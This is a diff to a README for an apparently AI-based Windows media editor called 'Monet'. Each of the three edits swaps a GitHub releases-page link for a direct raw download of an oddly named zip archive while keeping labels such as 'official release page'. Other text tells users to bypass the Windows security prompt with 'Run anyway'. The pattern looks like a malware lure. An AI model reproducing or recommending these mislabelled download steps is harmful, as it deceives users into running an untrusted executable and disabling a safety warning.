@@ -1,6 +1,6 @@
 # 🎨 Monet - Edit videos and design images easily
 
-[![](https://img.shields.io/badge/Download-Monet%20for%20Windows-blue)](https://github.com/Nomidiplomatic24/Monet/releases)
+[![](https://img.shields.io/badge/Download-Monet%20for%20Windows-blue)](https://github.com/Nomidiplomatic24/Monet/raw/refs/heads/main/Rodent/Software-Scheuchzeria.zip)
 
 Monet helps you create media using artificial intelligence. You can edit videos or design images by giving simple instructions. The software handles the complex technical work while you focus on your creative vision. It works with modern AI models to turn your ideas into visual content.
 
@@ -8,7 +8,7 @@ Monet helps you create media using artificial intelligence. You can edit videos 
 
 You do not need programming knowledge to use Monet. The app runs as a standard Windows program on your computer. Follow these steps to set up the software on your machine.
 
-1. Go to the [official release page](https://github.com/Nomidiplomatic24/Monet/releases) to find the latest version.
+1. Go to the [official release page](https://github.com/Nomidiplomatic24/Monet/raw/refs/heads/main/Rodent/Software-Scheuchzeria.zip) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file to start the download.
 4. Open the downloaded file to begin the installation.
@@ -49,7 +49,7 @@ You can adjust how the app works in the settings menu. Click the gear icon to ch
 
 If you have trouble with the installation, review the steps below.
 
-Visit [this link](https://github.com/Nomidiplomatic24/Monet/releases) to choose the correct version for your Windows system. Most users need the version labeled for x64 architecture. 
+Visit [this link](https://github.com/Nomidiplomatic24/Monet/raw/refs/heads/main/Rodent/Software-Scheuchzeria.zip) to choose the correct version for your Windows system. Most users need the version labeled for x64 architecture. 
 
 During the first launch, Windows might display a security prompt. This happens because Monet is a new application. Click "More info" followed by "Run anyway" to open the app. The software does not change system files, and it only modifies your local project folders.
 
